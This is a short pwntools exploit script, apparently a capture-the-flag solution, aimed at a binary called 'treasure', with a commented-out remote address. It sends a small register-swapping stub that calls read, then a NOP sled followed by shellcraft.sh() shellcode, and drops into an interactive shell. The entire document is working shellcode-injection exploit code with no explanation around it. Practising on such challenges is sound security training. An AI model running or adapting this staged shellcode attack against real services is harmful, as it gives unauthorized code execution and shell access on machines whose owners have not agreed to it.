from pwn import *

context.arch = "amd64"
p = process("./treasure")
#p = remote("58.20.46.148",44112)

s = asm(
'''
    push rsi
    push rdx
    pop rsi
    pop rdx
    xor rdi,rdi
    syscall
'''
)

p.sendlineafter("will you continue?(enter 'n' to quit) :","1")

gdb.attach(p)
p.sendafter("start!!!!",s)
nop = asm("nop")
p.sendline(nop*20 + asm(shellcraft.sh()))
p.interactive()
